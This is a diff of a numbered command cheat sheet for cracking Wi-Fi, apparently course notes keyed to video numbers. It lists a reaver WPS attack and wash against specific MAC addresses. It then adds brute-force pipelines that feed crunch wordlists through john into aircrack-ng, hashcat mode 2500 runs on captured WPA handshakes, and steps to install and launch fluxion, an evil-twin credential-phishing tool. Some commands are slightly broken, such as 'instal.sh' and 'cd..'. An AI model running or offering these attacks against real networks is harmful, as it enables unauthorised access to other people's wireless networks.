@@ -154,7 +154,7 @@ Section -5
 8) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A -vvv --no-nacks 
 
 
-v-32)
+v-33)
 
 9) wash -i mon0 
 
@@ -171,7 +171,7 @@ v-32)
 
 Section - 6
 
-v-1)
+v-35)
 
 1) aircrack-ng handshake-01.cap -w wpa-wordlist 
 
@@ -181,3 +181,52 @@ v-1)
 
 4) john --restore=upc | aircrack-ng -w - -b 00:10:18:90:2D:EE handshake-01.cap
 
+v-36)
+
+5) crunch 8 8 -o all.txt
+
+6) crunch 8 8
+
+7) crunch 8 8 | aircrack-ng -b 00:10:18:90:2D:EE -w - handshake-01.cap
+
+v-37)
+
+8) crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b 00:10:18:90:2D:EE -w - handshake-01.cap
+
+9) crunch 8 8 | john --restore=session1 | aircrack-ng -b 00:10:18:90:2D:EE -w - handshake-01.cap
+
+v-39)
+
+10) hashcat64.exe --help
+
+11) hashcat64.exe -m 2500 -d 1 handshake.hccapx rockyou.txt
+
+section -7 
+
+v-40)
+
+1) route -n 
+
+v-41) 
+
+2) git clone fluxion.git
+  
+3) cd opt 
+
+4) cd fluxion
+
+5) cd install
+
+6) bash instal.sh
+
+7) cd..
+
+8) bash fluxion.sh
+
+v-42)
+
+9) cd /opt/fluxion
+
+10) bash fluxion.sh
+
+11) 
